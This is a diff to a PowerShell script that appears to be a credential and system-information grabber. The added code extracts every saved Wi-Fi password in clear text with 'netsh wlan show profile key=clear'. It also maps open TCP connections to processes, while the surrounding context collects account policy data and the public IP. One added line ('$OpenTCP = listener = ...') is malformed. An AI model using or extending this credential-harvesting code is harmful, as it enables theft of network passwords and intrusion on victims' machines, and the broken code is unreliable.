@@ -44,7 +44,7 @@ $password = net accounts | Format-List  | Out-String
 #########################################################
 #Wifi stuff
 $nbwifi = netsh wlan show networks mode=bssid | Format-List  | Out-String
-$wifipswrd = netsh wlan show profiles | Format-List  | Out-String
+$wifipswrd = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 #########################################################
 #IP stuff
 $PublicIP = (Invoke-WebRequest -Uri "https://api.ipify.org").Content
@@ -68,12 +68,20 @@ $RamCapacity=(Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capa
 $Ram = (Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String).Trim()
 $COMsrldvc = Get-WmiObject Win32_SerialPort | Select-Object DeviceID, Description
 $OSinfo = Get-CimInstance -ClassName Win32_OperatingSystem
-$OpenTCP = Get-NetTCPConnection
-$OpenTcpstring = $OpenTcpstring = (
-    $OpenTCP | ForEach-Object {
-        "LocalAddress: $($_.LocalAddress), LocalPort: $($_.LocalPort), RemoteAddress: $($_.RemoteAddress), RemotePort: $($_.RemotePort), State: $($_.State)"
+$OpenTCP = listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
+$listener = $listener | foreach-object {
+    $listenerItem = $_
+    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
+    new-object PSObject -property @{
+      "LocalAddress" = $listenerItem.LocalAddress
+      "RemoteAddress" = $listenerItem.RemoteAddress
+      "State" = $listenerItem.State
+      "AppliedSetting" = $listenerItem.AppliedSetting
+      "OwningProcess" = $listenerItem.OwningProcess
+      "ProcessName" = $processItem.ProcessName
     }
-) -join "`n"
+} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
+
 
 #########################################################
 #Tree
@@ -149,7 +157,7 @@ All current processes:
 $process
 
 Open Tcp ports:
-$openTCPstring
+$openTCP
 
 "@ 
 ## Set temp folder path
